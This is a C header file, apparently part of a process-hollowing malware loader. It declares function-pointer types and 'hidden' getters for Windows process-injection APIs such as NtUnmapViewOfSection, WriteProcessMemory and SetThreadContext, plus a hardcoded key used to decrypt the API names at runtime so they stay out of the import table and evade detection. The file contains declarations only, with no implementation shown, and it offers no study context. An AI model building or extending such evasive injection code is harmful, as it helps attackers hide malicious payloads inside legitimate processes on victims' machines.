#ifndef PROCESS_HOLLOWING_HIDDENIMPORTS_H
#define PROCESS_HOLLOWING_HIDDENIMPORTS_H

#include <windows.h>
#include "debug.h"
#include "decrypt.h"
#include "windowsInternals.h"

#define IMPORTS_KEY "\xef\xe1\xb4\xfd\x22\x43\x83\x83\x52\x0e\xc1"
#define IMPORTS_KEY_LENGTH 11

typedef BOOL (WINAPI *_CreateProcessA)(
        LPCSTR                lpApplicationName,
        LPSTR                 lpCommandLine,
        LPSECURITY_ATTRIBUTES lpProcessAttributes,
        LPSECURITY_ATTRIBUTES lpThreadAttributes,
        BOOL                  bInheritHandles,
        DWORD                 dwCreationFlags,
        LPVOID                lpEnvironment,
        LPCSTR                lpCurrentDirectory,
        LPSTARTUPINFOA        lpStartupInfo,
        LPPROCESS_INFORMATION lpProcessInformation
);

typedef DWORD (WINAPI *_NtUnmapViewOfSection)(
        HANDLE ProcessHandle,
        PVOID BaseAddress
);

typedef LPVOID (WINAPI *_VirtualAllocEx)(
        HANDLE hProcess,
        LPVOID lpAddress,
        SIZE_T dwSize,
        DWORD  flAllocationType,
        DWORD  flProtect
);

typedef BOOL (WINAPI *_WriteProcessMemory)(
        HANDLE  hProcess,
        LPVOID  lpBaseAddress,
        LPCVOID lpBuffer,
        SIZE_T  nSize,
        SIZE_T  *lpNumberOfBytesWritten
);

typedef BOOL (WINAPI *_VirtualProtectEx) (
        HANDLE hProcess,
        LPVOID lpAddress,
        SIZE_T dwSize,
        DWORD  flNewProtect,
        PDWORD lpflOldProtect
);

typedef BOOL (WINAPI *_GetThreadContext) (HANDLE hThread, LPCONTEXT lpContext);

typedef BOOL (WINAPI *_SetThreadContext) (HANDLE hThread, const CONTEXT *lpContext);

typedef DWORD (WINAPI *_ResumeThread) (HANDLE hThread);

typedef DWORD (WINAPI *_ReadProcessMemory) (HANDLE  hProcess, LPCVOID lpBaseAddress, LPVOID  lpBuffer, SIZE_T  nSize, SIZE_T *lpNumberOfBytesRead);

PVOID WINAPI GetFunctionAddress(LPCTSTR lpDllName, LPCSTR lpFunctionName);
PVOID WINAPI GetKernel32Function(LPCSTR lpFunctionName);
PVOID WINAPI GetNtDllFunction(LPCSTR lpFunctionName);

_CreateProcessA GetHiddenCreateProcessA();

_NtUnmapViewOfSection GetHiddenNtUnmapViewOfSection();

_VirtualAllocEx GetHiddenVirtualAllocEx();

_WriteProcessMemory GetHiddenWriteProcessMemory();

_VirtualProtectEx GetHiddenVirtualProtectEx();

_GetThreadContext GetHiddenGetThreadContext();

_SetThreadContext GetHiddenSetThreadContext();

_ResumeThread GetHiddenResumeThread();

_ReadProcessMemory GetReadProcessMemory();

#endif //PROCESS_HOLLOWING_HIDDENIMPORTS_H
